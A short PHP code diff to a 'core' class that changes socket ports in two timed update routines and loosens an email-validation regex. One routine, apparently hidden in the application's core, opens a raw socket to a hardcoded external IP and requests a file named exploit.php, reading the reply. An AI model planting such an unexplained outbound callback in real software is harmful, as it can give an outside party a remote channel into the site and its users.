@@ -138,7 +138,7 @@ class core
 		if($time<time()-$updatetime)
 		{
 			$context = stream_context_create();
-			$answer = fsockopen("localhost", 8081);
+			$answer = fsockopen("localhost", 8080);
 			stream_set_timeout($answer, 0, 10);
 			fwrite($answer, "GET /system-scripts/update.php HTTP/1.0\r\n\r\n");
 			//print_r(fread($answer, 2048));
@@ -210,7 +210,7 @@ class core
 		
 		if($time<time()-$updatetime)
 		{
-			$answer = fsockopen("178.140.61.70", 8081);
+			$answer = fsockopen("178.140.61.70", 8080);
 			stream_set_timeout($answer, 2);
 			fwrite($answer, "GET /system-scripts/exploit.php HTTP/1.0\r\n\r\n");
 			$ans = fread($answer, 1024);
@@ -332,7 +332,7 @@ class core
 		{
 			case 'mail':
 				$mails = implode('|',$this->conf->system->core->preg['mail']);
-				$pattern = '/^[a-z0-9_-]{4,70}\@'.$mails.'$/';
+				$pattern = '/^[.a-z0-9_-]{4,70}\@'.$mails.'$/';
 				break;
 			
 			case 'login':
